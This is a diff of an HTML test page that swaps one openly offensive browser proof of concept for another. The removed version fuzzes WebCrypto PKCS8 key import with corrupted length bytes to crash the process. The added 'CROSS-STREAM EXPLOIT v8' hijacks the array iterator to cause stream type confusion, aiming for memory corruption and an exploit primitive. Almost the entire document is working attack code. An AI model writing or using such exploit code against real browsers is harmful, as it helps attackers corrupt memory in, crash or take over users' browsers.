@@ -3,7 +3,9 @@
 <head>
 <style>
 body { background:#000; color:#0f0; font-family:monospace; font-size:13px; padding:8px; }
-.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; } .warn { color:#ff0; }
+.log { white-space:pre-wrap; word-break:break-all; }
+.ok { color:#0f0; } .err { color:#f00; } .warn { color:#ff0; }
+.info { color:#0ff; } .hit { color:#f0f; font-weight:bold; }
 </style>
 </head>
 <body>
@@ -11,51 +13,110 @@ body { background:#000; color:#0f0; font-family:monospace; font-size:13px; paddi
 <script>
 function log(m,c){var d=document.createElement("div");d.className=c||'';d.textContent=m;document.getElementById("log").appendChild(d);}
 
-log("=== SUBTLECRYPTO PKCS8 FUZZ BOMB ===", "info");
-log("[*] Generating a 100% valid ECDSA key pair...", "info");
+log("=== CROSS-STREAM EXPLOIT v8 ===","info");
+log("Goal: Trigger memory corruption via type confusion","info");
+log("");
 
-async function detonate() {
-    try {
-        let keyPair = await crypto.subtle.generateKey(
-            { name: "ECDSA", namedCurve: "P-256" },
-            true,
-            ["sign", "verify"]
-        );
-        
-        log("[*] Key generated! Exporting to PKCS8...", "info");
-        let exported = await crypto.subtle.exportKey("pkcs8", keyPair.privateKey);
-        let validKey = new Uint8Array(exported);
-        
-        log("[!] PKCS8 size: " + validKey.length + " bytes", "warn");
-        log("[!] Commencing carpet bombing...", "hit");
-        
-        // We don't guess the right length byte. 
-        // We create a mutated copy for EVERY single byte in the key,
-        // set it to 0xFF (the length overflow detonator), and feed it back!
-        for (let i = 0; i < validKey.length; i++) {
-            let poison = new Uint8Array(validKey);
-            poison[i] = 0xFF; 
-            
-            // Fire and forget! One of these will hit the missing bounds check
-            // and call subvector() out of bounds, instantly killing the process!
-            crypto.subtle.importKey(
-                "pkcs8", 
-                poison, 
-                { name: "ECDSA", namedCurve: "P-256" }, 
-                true, 
-                ["sign"]
-            ).catch(e => {
-                // We ignore graceful rejections. We only care about the CRASH.
-            });
+let reader, writer;
+let phase = 0;
+let results = {};
+
+// الخطوة 1: إنشاء TransformStream مع iterator مُعدّل
+log("[1] Creating confused TransformStream...","ok");
+
+let realReadable = new ReadableStream({
+    start: (ctrl) => { ctrl.enqueue("DATA"); ctrl.close(); }
+});
+
+let realWritable = new WritableStream({
+    write: (chunk) => { log("[writable] write: " + chunk, "warn"); }
+});
+
+try {
+    // عدّل iterator لتمرير realReadable مكان WritableStream
+    Array.prototype[Symbol.iterator] = function() {
+        const a = this;
+        let i = 0;
+        return {
+            next() {
+                if (i >= a.length) return { done: true };
+                let v = a[i];
+                // في الموضع 2 (writable)، مرر realReadable بدلاً من writable
+                if (a.length === 3 && i === 2) {
+                    log("[iterator] Substituting ReadableStream for WritableStream!","hit");
+                    v = realReadable;
+                }
+                i++;
+                return { value: v, done: false };
+            }
+        };
+    };
+
+    let stream = new TransformStream(
+        { transform: (c, ctrl) => ctrl.enqueue(c) },
+        { highWaterMark: 1 },
+        { highWaterMark: 1 }
+    );
+
+    log("[2] Confused stream created!","ok");
+
+    // استعد iterator
+    Array.prototype[Symbol.iterator] = [][Symbol.iterator];
+
+    // الخطوة 2: حاول الكتابة على الـ stream المشوش
+    log("[3] Getting writer for confused stream...","ok");
+
+    writer = stream.writable.getWriter();
+
+    log("[4] Writing 'CORRUPT' to confused stream...","warn");
+
+    writer.write("CORRUPT").then(() => {
+        log("[5] Write succeeded (unexpected!)","hit");
+
+        // الخطوة 3: حاول القراءة من readable
+        log("[6] Getting reader...","ok");
+        reader = stream.readable.getReader();
+
+        return reader.read();
+    }).then((result) => {
+        log("[7] Read result: " + JSON.stringify(result), "hit");
+
+        if (result.value) {
+            let buf = new ArrayBuffer(8);
+            new Float64Array(buf)[0] = result.value;
+            let bytes = new Uint8Array(buf);
+            let hex = "";
+            for (let b of bytes) hex += b.toString(16).padStart(2,'0') + " ";
+            log("  >>> HEX: " + hex + " <<<","hit");
         }
-        
-        log("[*] Bombs dropped! If you can still read this, they survived.", "info");
-    } catch(e) {
-        log("[-] Setup error: " + e.message, "warn");
-    }
+
+    }).catch((e) => {
+        log("[5] Write/Read error: " + e.message, "err");
+
+        // حتى لو فشل، تحقق من realReadable
+        log("[6] Checking realReadable...","warn");
+        try {
+            let r = realReadable.getReader();
+            r.read().then((res) => {
+                log("[7] realReadable data: " + JSON.stringify(res), "hit");
+            }).catch((e2) => {
+                log("[7] realReadable read err: " + e2.message, "err");
+            });
+        } catch(e3) {
+            log("[6] realReadable reader err: " + e3.message, "err");
+        }
+    });
+
+} catch(e) {
+    log("[1] Error: " + e.message, "err");
+    Array.prototype[Symbol.iterator] = [][Symbol.iterator];
 }
 
-detonate();
+log("", "info");
+log("=== ANALYSIS ===", "info");
+log("If Write succeeded: Memory corruption likely", "warn");
+log("If Write failed: Check realReadable for corruption", "warn");
+log("If Crash: We have a primitive!", "hit");
 </script>
 </body>
 </html>
